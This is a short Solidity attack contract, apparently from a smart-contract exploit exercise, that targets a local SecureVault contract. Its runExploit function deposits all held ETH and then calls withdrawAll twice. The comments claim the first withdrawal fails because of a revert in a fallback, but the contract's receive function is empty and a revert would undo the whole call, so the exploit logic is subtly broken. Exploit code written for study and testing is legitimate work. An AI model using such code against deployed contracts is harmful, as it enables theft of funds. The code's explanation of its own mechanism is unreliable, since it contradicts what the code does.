// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {SecureVault} from "../src/SecureVault.sol";

contract ExploitModule {
    SecureVault public targetContract;

    constructor(address _target) payable {
        targetContract = SecureVault(payable(_target));
    }

    function runExploit() external payable {
        // Deposit some ETH into the vault
        targetContract.deposit{value: address(this).balance}();

        // Call withdrawAll which will fail due to revert in fallback function
        targetContract.withdrawAll();

        // Try to withdraw again, should work now
        targetContract.withdrawAll();
    }

    receive() external payable {}
}
